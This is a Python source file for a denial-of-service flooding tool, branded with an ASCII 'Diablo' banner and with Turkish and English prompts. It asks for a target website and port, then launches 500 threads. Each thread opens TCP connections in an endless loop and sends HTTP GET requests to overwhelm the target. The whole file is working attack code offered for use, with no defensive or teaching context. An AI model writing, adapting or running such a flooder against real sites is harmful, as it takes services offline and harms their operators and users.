import socket
import threading 
from pip._vendor.colorama import Fore
import subprocess

subprocess.call("clear", shell=True)

baner31 = """

▓█████▄  ██▓ ▄▄▄       ▄▄▄▄    ██▓     ▒█████  
▒██▀ ██▌▓██▒▒████▄    ▓█████▄ ▓██▒    ▒██▒  ██▒
░██   █▌▒██▒▒██  ▀█▄  ▒██▒ ▄██▒██░    ▒██░  ██▒
░▓█▄   ▌░██░░██▄▄▄▄██ ▒██░█▀  ▒██░    ▒██   ██░
░▒████▓ ░██░ ▓█   ▓██▒░▓█  ▀█▓░██████▒░ ████▓▒░
 ▒▒▓  ▒ ░▓   ▒▒   ▓▒█░░▒▓███▀▒░ ▒░▓  ░░ ▒░▒░▒░ 
 ░ ▒  ▒  ▒ ░  ▒   ▒▒ ░▒░▒   ░ ░ ░ ▒  ░  ░ ▒ ▒░ 
 ░ ░  ░  ▒ ░  ░   ▒    ░    ░   ░ ░   ░ ░ ░ ▒  
   ░     ░        ░  ░ ░          ░  ░    ░ ░  
 ░                          ░                  """

print(Fore.RED+baner31)
print(Fore.RED+"İnstagram = diabloakar & l4ncelotcoder")
print(Fore.GREEN+"Github = https://github.com/DiabloAkar/L4ncelot-Diablo-dos-attack")

print(Fore.BLUE+"DDos Website (K.O.S) ")
print(Fore.BLUE+"website url")
target = input(Fore.RED+" ┌─/"+Fore.LIGHTBLUE_EX+"Write Website"+Fore.RED+"""/
 └──╼ """+Fore.LIGHTRED_EX+"=> ")

print("K.O.S Port Tarama uzerinden baktığınzı açık portu girin")
port = input(Fore.RED+" ┌─/"+Fore.LIGHTRED_EX+"Write Port"+Fore.RED+"""/
 └──╼ """+Fore.LIGHTRED_EX+"=> ")

port = int(port)

attack_num = 0

print("K.O.S Sending Packets...")

def attack():

    while True:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target, port))
        s.sendto(("GET /" + target + " HTTP/1.1\r\n").encode('ascii'), (target, port))
        s.sendto(("Host: " + "\r\n\r\n").encode('ascii'), (target, port))
        
        global attack_num
        attack_num += 1
        packesnum =attack_num
        packesnum= str(packesnum)
        print(Fore.CYAN+'[!]'+"Paketler Gönderiliyor------> "+Fore.YELLOW+packesnum)
        
        
print("Paketler Basari ile gonderildi!")

for i in range(500):
    thread = threading.Thread(target=attack)
    thread.start()